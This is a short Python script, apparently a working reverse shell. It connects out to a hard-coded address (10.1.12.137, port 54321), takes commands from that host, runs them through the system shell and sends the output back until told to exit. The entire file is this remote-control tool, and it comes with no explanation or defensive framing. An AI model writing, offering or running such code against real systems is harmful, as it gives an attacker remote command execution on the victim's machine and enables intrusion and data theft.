import socket
import subprocess

SERVER_IP = "10.1.12.137"
PORT = 54321

def run_cmd(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return output
    except:
        return b"Command failed\n"

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((SERVER_IP, PORT))

    while True:
        data = s.recv(1024)
        if not data:
            break

        cmd = data.decode().strip()

        if cmd == "exit":
            break

        output = run_cmd(cmd)

        if not output:
            output = b"[No output]\n"

        s.send(output)

    s.close()

if __name__ == "__main__":
    main()
